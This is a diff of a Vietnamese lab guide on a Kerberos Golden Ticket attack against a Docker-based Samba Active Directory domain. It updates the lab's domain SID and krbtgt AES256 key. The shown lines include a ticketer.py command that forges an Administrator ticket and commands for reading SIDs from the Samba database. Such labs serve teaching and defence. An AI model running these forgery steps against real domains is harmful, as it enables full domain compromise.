@@ -123,10 +123,10 @@ Mục đích: Chứng minh cơ chế xác thực Single Sign-On (SSO) dựa trê
 ### PHẦN 2: DEMO TẤN CÔNG GOLDEN TICKET (MÁY ATTACKER)
 
 #### 1. Thông số bí mật của Domain trong Lab
-* **Domain SID**: `S-1-5-21-3517008435-4032162519-3515808235`
+* **Domain SID**: `S-1-5-21-2267991049-1042033777-3075046612`
 * **Khóa AES256 của tài khoản `krbtgt`**:
   ```text
-  251c34132ea70a1a25022cdf1a3ad73dfd7b5ee2f926431103c1c57afa744700
+  99f840125f7ced300881efae473185851e160a377cdaa86b6ddc17c185f877bb
   ```
 
 #### 2. Thực thi kịch bản tấn công trên máy Attacker
@@ -139,8 +139,8 @@ Mục đích: Chứng minh cơ chế xác thực Single Sign-On (SSO) dựa trê
    Chạy công cụ `ticketer.py`:
    ```bash
    ticketer.py \
-     -aesKey 251c34132ea70a1a25022cdf1a3ad73dfd7b5ee2f926431103c1c57afa744700 \
-     -domain-sid S-1-5-21-3517008435-4032162519-3515808235 \
+     -aesKey 99f840125f7ced300881efae473185851e160a377cdaa86b6ddc17c185f877bb \
+     -domain-sid S-1-5-21-2267991049-1042033777-3075046612 \
      -domain LAB.KERB \
      -user-id 500 \
      Administrator
@@ -189,7 +189,7 @@ Mục đích: Chứng minh cơ chế xác thực Single Sign-On (SSO) dựa trê
    ```bash
    exit
    ```
-1. Nguồn gốc của Domain SID (S-1-5-21-3517008435-4032162519-3515808235)
+1. Nguồn gốc của Domain SID (S-1-5-21-2267991049-1042033777-3075046612)
 
 Trong kiến trúc Active Directory, Security Identifier (SID) của một tài khoản luôn có cấu trúc: 
 SID
@@ -207,13 +207,13 @@ docker compose exec dc wbinfo --name-to-sid Administrator
 Kết quả trả về trên màn hình:
 
 text
-S-1-5-21-3517008435-4032162519-3515808235-500 SID_USER (1)
+S-1-5-21-2267991049-1042033777-3075046612-500 SID_USER (1)
 
-👉 Khi bạn bỏ phần RID -500 ở cuối, phần còn lại chính là Domain SID: S-1-5-21-3517008435-4032162519-3515808235.
+👉 Khi bạn bỏ phần RID -500 ở cuối, phần còn lại chính là Domain SID: S-1-5-21-2267991049-1042033777-3075046612.
 
 (Bạn cũng có thể tra trực tiếp trong database sam.ldb của Samba bằng lệnh: docker compose exec dc ldbsearch -H /var/lib/samba/private/sam.ldb "(sAMAccountName=krbtgt)" objectSid, kết quả trả về ...-502 tương tự).
 
-2. Nguồn gốc của krbtgt AES256 Key (251c34132ea70a1a25022cdf1a3ad73dfd7b5ee2f926431103c1c57afa744700)
+2. Nguồn gốc của krbtgt AES256 Key (99f840125f7ced300881efae473185851e160a377cdaa86b6ddc17c185f877bb)
 
 Trong tài liệu gốc .docx, tác giả đề xuất dùng lệnh:
 
@@ -267,7 +267,7 @@ while idx < len(data):
 Kết quả trả về chính xác:
 
 text
-krbtgt AES256 Key: 251c34132ea70a1a25022cdf1a3ad73dfd7b5ee2f926431103c1c57afa744700
+krbtgt AES256 Key: 99f840125f7ced300881efae473185851e160a377cdaa86b6ddc17c185f877bb
 ---
 
 ## IV. BẢNG SO SÁNH: LUỒNG HỢP LỆ VS. GOLDEN TICKET
